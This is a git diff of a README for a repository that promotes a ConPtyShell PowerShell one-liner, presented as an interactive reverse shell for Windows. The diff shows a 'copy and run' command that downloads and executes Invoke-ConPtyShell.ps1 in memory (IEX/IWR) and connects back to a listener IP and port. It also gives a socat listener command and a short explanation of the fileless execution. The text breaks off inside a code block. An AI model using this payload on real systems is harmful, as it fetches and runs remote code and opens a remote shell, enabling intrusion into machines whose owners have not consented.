@@ -1,11 +1,13 @@
-# 🐚 ConPtyShell One-Liner
+# 🐚 ConPtyShell PowerShell One-Liner
 
 <div align="center">
 
-[![PowerShell](https://img.shields.io/badge/PowerShell-Core%20%2F%20Windows-blue.svg)](https://github.com/PowerShell/PowerShell)
-[![Type](https://img.shields.io/badge/Type-Interactive%20Reverse%20Shell-red.svg)](https://github.com/antonioCoco/ConPtyShell)
+[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B%20%2F%20Core-blue.svg)](https://github.com/PowerShell/PowerShell)
+[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
+[![Type](https://img.shields.io/badge/Type-Interactive%20Pseudo%20Console%20(ConPTY)-red.svg)](https://github.com/antonioCoco/ConPtyShell)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
-*A powerful PowerShell-based interactive Pseudo Console (ConPTY) reverse shell payload for Windows.*
+*An advanced, fully interactive Windows Pseudo Console (ConPTY) reverse shell runner leveraging fileless execution.*
 
 </div>
 
@@ -13,47 +15,28 @@
 
 ## 📖 Table of Contents
 - [Overview](#-overview)
-- [The One-Liner](#-the-one-liner)
-- [How It Works](#-how-it-works)
+- [The Payload](#-the-payload)
+- [Technical Breakdown](#-technical-breakdown)
+- [Features & Advantages](#-features--advantages)
 - [Prerequisites](#-prerequisites)
-- [Usage](#-usage)
+- [Step-by-Step Usage Guide](#-step-by-step-usage-guide)
+- [Troubleshooting](#-troubleshooting)
 - [Disclaimer](#-disclaimer)
+- [License](#-license)
 
 ---
 
 ## 🚀 Overview
 
-This repository features a quick fileless execution payload utilizing **ConPtyShell** (`Invoke-ConPtyShell.ps1`) by `antonioCoco`. Unlike basic reverse shells, ConPtyShell creates a fully interactive Windows Pseudo Console (ConPTY), providing a rich terminal experience (supporting command history, proper terminal resizing, and text formatting) over a netcat or custom listener.
+This repository documents and streamlines the usage of **ConPtyShell** (`Invoke-ConPtyShell.ps1`), originally developed by `antonioCoco`. 
+
+Unlike traditional, legacy reverse shells (which often suffer from broken backspaces, lack of terminal resizing, and awkward command-history navigation), ConPtyShell spawns a native Windows Pseudo Console (`ConPTY`). This bridges the target's internal processes with your terminal handler, giving you a true, high-fidelity interactive shell experience.
 
 ---
 
-## ⚡ The One-Liner
+## ⚡ The Payload
+
+Copy and run the following command inside a PowerShell session on the target Windows system:
 
 ```powershell
 IEX(IWR [https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1) -UseBasicParsing); Invoke-ConPtyShell 192.168.178.118 33413
-
----
-
-## ⚙️ How It Works
-
-1. **`IWR (Invoke-WebRequest)`**: Fetches the PowerShell script from GitHub using basic parsing.
-2. **`IEX (Invoke-Expression)`**: Executes the downloaded script directly in memory without writing it to disk (fileless execution).
-3. **`Invoke-ConPtyShell`**: Calls the function, pointing it to the target listener IP (`192.168.178.118`) and port (`33413`).
-
----
-
-## 📋 Prerequisites
-
-- Windows target machine with PowerShell enabled.
-- Network routing/connectivity to the listener IP.
-- A listener set up to catch the ConPTY connection.
-
----
-
-## 💻 Usage
-
-> **⚠️ Warning:** This command is intended strictly for educational purposes, authorized penetration testing, and CTF challenges.
-
-1. **Set up a listener** on your machine (note that ConPtyShell typically requires a specialized listener or a raw socket handler like `socat` or the accompanying C# listener to handle the terminal dimensions properly):
-   ```bash
-   socat file:`tty`,raw,echo=0 tcp-listen:33413
